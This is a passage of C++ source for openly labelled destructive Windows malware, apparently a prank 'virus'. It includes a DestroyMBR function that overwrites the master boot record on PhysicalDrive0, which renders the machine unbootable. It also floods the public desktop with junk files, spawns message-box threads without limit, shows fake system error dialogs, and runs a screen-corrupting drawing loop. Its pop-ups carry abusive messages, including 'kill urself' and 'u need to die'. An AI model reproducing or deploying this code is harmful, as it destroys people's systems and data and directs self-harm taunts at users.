    CreateFileA("\\Users\\Public\\Desktop\\æðáðéáåßðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼³€³¤þ€¤þ€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³ðß®þé€þé®þú®", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\þ³¤þ³¤þ³¤ü®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßððððþþð®®éð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ß®ééþé®þ®þ®ðð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áßææááßååéé", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³ßß®é©ñüþúþúþ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åéå®é®ßßé³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\íøóßéüóúßßüáá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éé€®®ü¼€€¼ú€ú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éåé®þé€ü€ü€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ó®íñåááðßáðß®", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ß®é®éþ®ééðßßß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ðåþ€éü®€ú®¼®þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å®³éþé®€¤éé®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¡äáéþé®þ¤¼€4®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\²ääåå¼½üüíþ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r²²³²³®þþ®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r35¼½é®þþ®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r¤³²²¡666¤²®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\rgeéþé®þþ®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¼þ®®¼¼6¼¼66®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r³€€¼¤½¤½®®®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\2¤éåþüééé®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\r4³€²¤¼³¼½ü¾’’®®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µñ©ááåé®²åßé¼í¾ó", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åíöéþíßßúßßðéáááßßðá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\íðåáúäðúñó³‘¼«å¥²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñí©ååååü®ßðßw²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\þéóßðöÐÉÅÐðáá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñí¤³åäðåäéåé¤²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öé³¤üþüüþþé®ðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñí²éå®íóüþ®éé²²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áåüö¬¬»«’úü¼¤þ³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áä³¤¬«öóúü¼‘¥×«®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¬»¥¥’ö«’¾¼¤³ðé¡³®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öåéðó©å®€®ééåééåßð²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ö®íáþóßó®þñéðéó®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éñðé®µáñåíøøñóþ®éá©þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åéåþüúþ½ðßðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßðé®ééóéóó©þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öáñíåéå©óáåðí²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\öíáµßðéåéåéåí²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á³€¼¾€53³²²³®þ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ö¤³²€€ü€¤¤þ³¤þþ®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ö3²€¤®ðéå³2²³³®²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á€€¼ü€ü€üú¼½¾¬»«öö«»²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®é©úéñþé²®³¤þ³€¼éáåðä", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úß³þ¼ú½¼í¤ðåq3r€ü¤€ü€¼", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÞÉ®ÉÍßÑÓÉß©ÁÖÉ®ÍÞÑÓÅ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\NOESCAPE³®³¤Þ¤Þ³Þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úßßíáñ¤®³Þ€³Ü¤€¤ÜÜå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úß²³®²®Þ³¤Þ³¤Þ³óå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®úßßíáñðé®²®²ÐÅßßßåóå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®É³Þ€Þ¤€¼€€€®ÉÉÁÁÅÅÉÅÉå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\chÚÖÁØÁ’ÉÑÐÉ®µÁÑå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\É²Å®ÉÓÅÖÚÞÓÉØÄÚÉØÓÉÉÉ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÖÚÞÓÉØÄÚÉØÉÉxðxðxðdx", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åååé®®³þ€ü¤¼ü½€ú€½íú€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Íáþéß©óøøø¡¡¡¡²²³¡¤²¤¤²€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éñðé®µáñíáþééñðé®µáñ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Éñðé®µáñFú©kÚüóúüóúüóú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\aáåå®®þ¤þü€ü¤ú¼ú¼€ú€€34", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤²þ³þü¤ü77½€¤³666¼€¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áßíðéåí®éé®®þðßóíáøðáéå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\a®é®þþ®óé®äåíóåíðäóíåéóå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åðåééó®é®éåéåéåé®¤€€¤½¼½€½", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\äßåðé®é®éþge®åéåååfweåteþé®þéü®þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\A©©Éßß_Íß_ÐÉÑÍÉÐÐÐÐÐÐ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\TßÍßÍßßÍßÍÐÐÅÓÉ®ÍÉ®ÉÍ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÚÐ©Ð©®É®®¤Þ€Ü¼€½€WÉ®ÉREGEG", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åü½¤²²²þ¤€½€¾¾¼¾½½¾", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åü½¤²²²þ¤€½€¾¾¼¾½½¾", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÐÉØÉÞÉ¥ÞÍßµÉßßßÅÅÉÞ³¤Þ³¤€ÍÞ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Å®¤³¤¤€Ü’¤Ü’®’³®’²³®’²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Á®ÉÁ51ØÓØØØØØØØØØØØØØ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÅÓÁÞÉßµÉßßßØßÐÉÓ€Ü¾¥¬×¬«", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€¼¤½¬¾¼¬€¬€³¬¤²¬»×«", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÓµFG¥ÅÁÐÉÍÉ®ÉÍÉ®ÉÉ®É®ÍÉ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\AÐ®ÅÉÞÞ¤€³Ü¤Ü¤€Y4", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åÁÅÉ¼¼Í¾Í½½¾¼Ú€€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ÜÞßßÁÁÁÐÉ³€Ö¬¬¬¾Ö¾‘", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åúüþéåóðé®þüíó½½€³²²³³³¤¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßþóßöéóöåóþ¤é", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\vkþóñáñééåéééä", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
}


/* destroy MBR by overwrite it */
void DestroyMBR() {  

    DWORD dwBytesWritten;

    HANDLE MasterBootRecord = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

    WriteFile(MasterBootRecord, mbrContent, 512, &dwBytesWritten, NULL);

    CloseHandle(MasterBootRecord);

    cout << "\nMBR Has been destroyed\n";
}

/* first message box thread */
DWORD WINAPI messageBoxThread(LPVOID parameter) {
    while (1) {
        MessageBoxW(NULL, L"ur crazy, u ran unwanted virus", L"kill urself", MB_OK | MB_ICONWARNING);
        Sleep(3000);
        MessageBoxW(NULL, L"u need to die", L"ahahahahaah", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        MessageBoxW(NULL, L"(╯°□°)╯︵ ┻━┻ ", L"i will kill everyone",  MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"C:\\ folder is empty", L"lol", MB_OK | MB_ICONERROR);
        Sleep(2000);
        MessageBoxW(NULL, L"Interactive sign-in process initialization has failed.\n\nPlease check the event log for details.", L"Sign-in process initialization failure", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"next generation of enderman?\n huh? ur crazy", L"colorful", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"don't press ok", L"ur crazy!!!!", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"><(((*>", L"система", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
    }
    return 0;
}

/* 2nd message box thread */
DWORD WINAPI messageBox1Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"did you run it? why?", L"The Narrator", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"Stop clicking Ok", L"The Narrator", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"uR crazy bro u cannot run the unwanted virus", L"0_o", MB_OK | MB_ICONERROR);
        Sleep(1500);
        MessageBoxW(NULL, L"nel", L"yes", MB_OK | MB_ICONWARNING);
        Sleep(1500);
        MessageBoxW(NULL, L"null is Null or Inexistent", L"True or false?", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        MessageBoxW(NULL, L"The application was unable to start correctly (0xc000029A) Click OK to close the application", L"unwanted.exe - Application Error", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
    }
}

/* 3rd message box thread */
DWORD WINAPI messageBox2Thread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"anananananana", L"aaemnanandn", MB_OK | MB_ICONINFORMATION);
        Sleep(3000);
        MessageBoxW(NULL, L"lookk colorful bkgrn", L"ahahahahaah", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        Sleep(1500);
        MessageBoxW(NULL, L"die die die", L"i will kill everyone", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"aaaaaa\n  aaaaa", L"i will kill you first", MB_OK | MB_ICONINFORMATION);
        Sleep(2000);
        MessageBoxW(NULL, L"stop!", L"c'mon you are crazy", MB_OK | MB_ICONQUESTION);
        Sleep(1500);
        MessageBoxW(NULL, L"The sign-in process couldn't display security and sign-in\noptions when Ctrl+Alt+Delete was pressed. If Windows\ndoesn't respond, press Esc, or use the power switch to\nrestart.", L"Failure to display security and shut down options", MB_OK | MB_ICONERROR);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"game shift to shut\n alt & ctrl to move", L"space invaders", MB_OK | MB_ICONINFORMATION);
        Sleep(1500);
        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
    }
    return 0;
}

/* 4rd message box thread */
DWORD WINAPI urnidiotmsgbx(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    while (1) {
        MessageBoxW(NULL, L"You are an idiot!", L"You are an idiot!", MB_OK | MB_ICONWARNING);
        CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
        MessageBoxW(NULL, L"\n", L"\n", MB_OK | MB_ICONERROR);
        CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
    }
    return 0;
}

/* message box payload */
int payloadMessageBox(int times, int runtime) {
    CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
    Sleep(3000);
    CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
    Sleep(3000);
    CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
    Sleep(5500);
    CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);

    return 2000.0 / (times / 10.0 + 1) + 100 + (random() % 120);
}

/* message boxes when windows die */
DWORD WINAPI ripmessages(LPVOID parameter){
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxW(NULL, L"Now I will terminate your system", L"AAAAAAAA", MB_OK | MB_ICONWARNING);
    MessageBoxW(NULL, L"Stop Pressing OK!", L"AAAAAAAA", MB_OK | MB_ICONWARNING);
    return 1;
}

DWORD WINAPI STARTripmessages(LPVOID parameter) {
    while (1) {
        CreateThread(NULL, 4096, &ripmessages, NULL, NULL, NULL);
        Sleep(100);
    }
}


int DestroyURScreen() {
    

    while (TRUE)
    {
        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY);
        PatBlt(hdc, -1, y, sw, h, PATINVERT);
        Sleep(rand() % 10);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCCOPY);
        hwnd = GetForegroundWindow();
        hW = GetWindowDC(hwnd);
        hdc = GetDC(0);
